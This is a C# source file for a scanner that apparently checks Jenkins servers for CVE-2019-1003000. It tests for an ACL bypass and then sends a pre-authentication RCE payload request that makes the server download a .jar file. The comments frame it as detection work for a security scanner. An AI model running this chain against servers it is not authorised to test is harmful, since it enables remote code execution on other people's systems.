using System;
using MatthiWare.CommandLine;
using jenkins_server_rce.commandlineargs;
using jenkins_server_rce.jenkinsrequests;
using System.Net.Http;
using System.Threading.Tasks;
using System.Threading;
using IronPython.Hosting;
using System.Collections.Generic;

namespace jenkins_server_rce
{
    class Program
    {
        public enum RCESuccess { Success, Failed, ErrorInRequest };

        static void Main(string[] args)
        {
            var arguments = CommandLineSetup(args);

            //Creating single instance of HttpClient in main in order to save memory 
            HttpClient client = new HttpClient();

            string targetURL = $"{arguments.Url}/securityRealm/user/admin/";

            bool isACLBypassable = Jenkins_Requests.DetectACLBypass(client, arguments.Url);
            if (isACLBypassable == true)
            {
                var didJarDownload = Jenkins_Requests.SendPayloadInGETRequest(targetURL, client);
                var isServerVulnerable = IsVulnerable(didJarDownload);
                Console.WriteLine($"Jenkins Server Vulnerable to CVE-2019-1003000\n********************************\n{isServerVulnerable}");

            }
            else
            {
                Console.WriteLine("Pre-auth RCE is not possible. In order to test for RCE, Detectify will require " +
                    "username, password and job name from client company.");
            }

            //If pre-auth RCE does not work, there is another way to exploit CVE-2019-100300 but it involves knowing
            //the the username, password and job information of the Jenkins server so I thought this is something that
            //may not be implemented in Detectify's scanner since it's not something you can just point at a domain and let run
            //by itself. However, I thought it was still interesting to play around with vulnerability and I think it's cool
            //how you can run python code with in a C# application (which is useful since the Jenkins REST-like api is geared
            //for Python).

        }

        //Function Name: CommandLineSetup
        //Function Parameters => Return Type : Void => Void
        //Function Purpose: Will set up required arguments to pass in from terminal
        static Cli_Args CommandLineSetup(string[] arguments) 
        {
            var options = new CommandLineParserOptions
            {
                AppName = "Detecting CVE-2019-1003000 RCE Bug"
            };
            var parser = new CommandLineParser<Cli_Args>(options);
            var result = parser.Parse(arguments);
            if (result.HasErrors)
            {
                Console.Error.WriteLine("Errors in command line arguments");
                return result.Result;
            }
            return result.Result;
        }


        //Function Name: IsVulnerable
        //Function Parameters => Return Type : string => enums
        //Function Purpose: Will set up required arguments to pass in from terminal
        static RCESuccess IsVulnerable(string response)
        {
            if (response == "success")
            {
                Thread.Sleep(1000);
                Console.WriteLine($"[x] Response status: {response}");
                return RCESuccess.Success;
            }else if (response == RCESuccess.ErrorInRequest.ToString())
            {
                Thread.Sleep(1000);
                Console.WriteLine("Because the ACL bypass vulnerablity was present, RCE is most likely present and there is an issue in the " +
                    "GET request. Please verify all parameters are accurate and try again.");
                return RCESuccess.ErrorInRequest;
            }
            else
            {
                Thread.Sleep(1000);
                Console.WriteLine($"[x] Response: {response}\n\n\nUnable to download .jar file");
                return RCESuccess.Failed;
            }
        }


    }
    
}
